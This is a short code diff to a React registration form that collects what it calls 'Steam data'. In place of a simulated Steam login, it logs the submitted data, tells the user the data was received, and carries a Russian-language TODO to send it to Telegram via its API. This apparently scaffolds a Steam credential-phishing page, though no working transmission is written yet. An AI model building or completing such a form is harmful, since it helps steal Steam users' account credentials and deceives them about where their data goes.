@@ -34,12 +34,22 @@ const RegisterForm = () => {
   const onSubmit = async (data: RegisterFormData) => {
     setIsLoading(true);
 
-    // Simulate Steam login verification
-    setTimeout(() => {
+    try {
+      // TODO: Здесь будет интеграция с Telegram API
+      console.log("Steam данные для отправки:", data);
+
+      // Симуляция отправки данных
+      setTimeout(() => {
+        setIsLoading(false);
+        toast.success(
+          "Данные Steam получены! (В разработке: отправка в Telegram)",
+        );
+        window.location.href = "/dashboard";
+      }, 2000);
+    } catch (error) {
       setIsLoading(false);
-      toast.success("Регистрация через Steam успешна!");
-      window.location.href = "/dashboard";
-    }, 2000);
+      toast.error("Ошибка при обработке данных Steam");
+    }
   };
 
   return (
